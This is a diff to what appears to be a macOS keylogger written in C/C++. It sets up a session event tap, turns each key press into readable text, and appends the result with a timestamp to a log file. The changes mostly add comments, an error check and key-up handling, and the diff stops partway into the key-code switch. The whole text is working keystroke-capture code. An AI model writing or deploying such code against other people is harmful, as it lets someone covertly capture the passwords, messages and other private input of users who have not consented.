@@ -2,38 +2,54 @@
 
 int main(int argc, const char *argv[]) {
 
-    CGEventFlags flags = CGEventSourceFlagsState(kCGEventSourceStateCombinedSessionState);
+    // Create an event tap to retrieve keypresses.
     CGEventMask eventMask = (CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged));
     CFMachPortRef eventTap = CGEventTapCreate(
-        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, &flags
+        kCGSessionEventTap, kCGHeadInsertEventTap, 0, eventMask, CGEventCallback, NULL
     );
 
+    // Exit the program if unable to create the event tap.
+    if(!eventTap) {
+        cout << "Unable to create event tap.\n" << endl;
+        exit(1);
+    }
+
+    // Create a run loop source and add enable the event tap.
     CFRunLoopSourceRef runLoopSource = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, eventTap, 0);
     CFRunLoopAddSource(CFRunLoopGetCurrent(), runLoopSource, kCFRunLoopCommonModes);
     CGEventTapEnable(eventTap, true);
 
+    // Get the current time and open the logfile.
     time_t result = time(NULL);
     logfile = fopen(logfileLocation, "a");
     
-    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n\n", asctime(localtime(&result)));
+    // Output to logfile.
+    fprintf(logfile, "\n\nKeylogging has begun.\n%s\n", asctime(localtime(&result)));
     fflush(logfile);
 
+    // Display the location of the logfile and start the loop.
     cout << "Logging to: " << logfileLocation << endl;
     CFRunLoopRun();
 
     return 0;
 }
 
+// The following callback method is invoked on every keypress.
 CGEventRef CGEventCallback(CGEventTapProxy proxy, CGEventType type, CGEventRef event, void *refcon) {
-    if ((type != kCGEventKeyDown) && (type != kCGEventFlagsChanged)) { return event; }
-    
+    if (type != kCGEventKeyDown && type != kCGEventFlagsChanged && type != kCGEventKeyUp) { return event; }
+
+    // Retrieve the incoming keycode.
     CGKeyCode keyCode = (CGKeyCode) CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
+
+    // Print the human readable key to the logfile.
     fprintf(logfile, "%s", convertKeyCode(keyCode));
     fflush(logfile);
 
     return event;
 }
 
+// The following method converts the key code returned by each keypress as
+// a human readable key code in const char format.
 const char *convertKeyCode(int keyCode) {
     switch ((int) keyCode) {
         case 0:   return "a";
